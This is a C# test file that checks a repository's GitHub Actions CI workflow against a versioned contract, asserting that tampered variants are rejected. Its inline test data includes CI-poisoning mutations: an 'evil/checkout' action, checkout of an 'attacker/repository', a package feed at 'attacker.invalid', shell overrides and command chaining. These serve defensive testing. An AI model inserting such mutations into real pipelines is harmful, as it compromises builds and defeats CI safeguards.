namespace Inquiry.ReleaseTools.Tests;

public sealed class CiContractTests
{
    [Fact]
    public void Repository_CI_matches_versioned_contract()
    {
        CiContractVerifier.Verify(
            RepositoryFixture.Root,
            Path.Combine(RepositoryFixture.Root, "eng", "ci-required-v1.json"),
            Path.Combine(RepositoryFixture.Root, ".github", "workflows", "ci.yml"));
    }

    [Fact]
    public void Unsafe_tag_rebuild_publisher_is_absent()
    {
        Assert.False(File.Exists(Path.Combine(RepositoryFixture.Root, ".github", "workflows", "release.yml")));
    }

    [Theory]
    [InlineData("bash -c 'exit 0' {0}")]
    [InlineData("!unsafe pwsh")]
    [InlineData("\"pwsh\"")]
    [InlineData("&approved-shell pwsh\n        shell-copy: *approved-shell")]
    public void Run_step_shell_drift_is_rejected(string shell)
    {
        var workflow = File.ReadAllText(Path.Combine(RepositoryFixture.Root, ".github", "workflows", "ci.yml"));
        const string approvedShell = "        shell: pwsh";
        Assert.Contains(approvedShell, workflow, StringComparison.Ordinal);
        var path = Path.Combine(Path.GetTempPath(), $"inquiry-ci-{Guid.NewGuid():N}.yml");
        File.WriteAllText(path, workflow.Replace(approvedShell, $"        shell: {shell}", StringComparison.Ordinal));
        try
        {
            Assert.Throws<ReleaseVerificationException>(() => CiContractVerifier.Verify(
                RepositoryFixture.Root,
                Path.Combine(RepositoryFixture.Root, "eng", "ci-required-v1.json"),
                path));
        }
        finally
        {
            File.Delete(path);
        }
    }

    [Theory]
    [InlineData("if: always()", "if: success()")]
    [InlineData("branches: [main, prerelease]", "branches: [main]")]
    [InlineData("tfm: [net8.0, net9.0, net10.0]", "tfm: [net8.0, net9.0]")]
    [InlineData("fail-fast: false", "fail-fast: \"false\"")]
    [InlineData("name: CI", "name: &workflow-name CI")]
    [InlineData("actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a", "actions/upload-artifact@v7")]
    [InlineData("if-no-files-found: error", "if-no-files-found: warn")]
    [InlineData("name: CI", "name: CI\nname: CI")]
    [InlineData("tfm: [net8.0, net9.0, net10.0]", "tfm: [net8.0, net9.0, net10.0]\n        exclude: []")]
    [InlineData("      - run: dotnet restore", "      - run: dotnet restore\n        continue-on-error: true")]
    [InlineData("      - run: dotnet restore", "      - if: success()\n        run: dotnet restore")]
    [InlineData("      - run: dotnet restore", "      - shell: bash -c 'exit 0' {0}\n        run: dotnet restore")]
    [InlineData("        shell: pwsh\n        run: ./eng/pack-release.ps1", "        run: ./eng/pack-release.ps1")]
    [InlineData("dotnet restore", "dotnet restore && echo bypass")]
    [InlineData("actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0", "evil/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0")]
    [InlineData("      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7\n      - uses: actions/setup-dotnet", "      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0 # v7\n        with:\n          repository: attacker/repository\n          ref: main\n          path: poisoned\n      - uses: actions/setup-dotnet")]
    [InlineData("          fetch-depth: 0", "          fetch-depth: 0\n          ref: prerelease")]
    [InlineData("          dotnet-version: 10.0.x", "          dotnet-version: 10.0.x\n          source-url: https://attacker.invalid/feed")]
    [InlineData("          INQUIRY_SQLSERVER_IMAGE: ${{ matrix.provider == 'SqlServer' && 'inquiry-sqlserver-fts:2022-cu14' || '' }}", "          INQUIRY_SQLSERVER_IMAGE: ${{ matrix.provider == 'SqlServer' && 'inquiry-sqlserver-fts:2022-cu14' || '' }}\n          INQUIRY_REQUIRE_DOCKER: 0")]
    [InlineData("          ARTIFACT_DIGEST: ${{ steps.upload.outputs.artifact-digest }}", "          ARTIFACT_DIGEST: ${{ steps.upload.outputs.artifact-digest }}\n          UNAPPROVED: bypass")]
    [InlineData("  ci-required-v1:", "  unexpected-job:\n    runs-on: ubuntu-latest\n    steps:\n      - run: true\n\n  ci-required-v1:")]
    public void Contract_drift_is_rejected(string oldValue, string newValue)
    {
        var workflow = File.ReadAllText(Path.Combine(RepositoryFixture.Root, ".github", "workflows", "ci.yml"));
        Assert.Contains(oldValue, workflow, StringComparison.Ordinal);
        var path = Path.Combine(Path.GetTempPath(), $"inquiry-ci-{Guid.NewGuid():N}.yml");
        File.WriteAllText(path, workflow.Replace(oldValue, newValue, StringComparison.Ordinal));
        try
        {
            Assert.Throws<ReleaseVerificationException>(() => CiContractVerifier.Verify(
                RepositoryFixture.Root,
                Path.Combine(RepositoryFixture.Root, "eng", "ci-required-v1.json"),
                path));
        }
        finally
        {
            File.Delete(path);
        }
    }
}
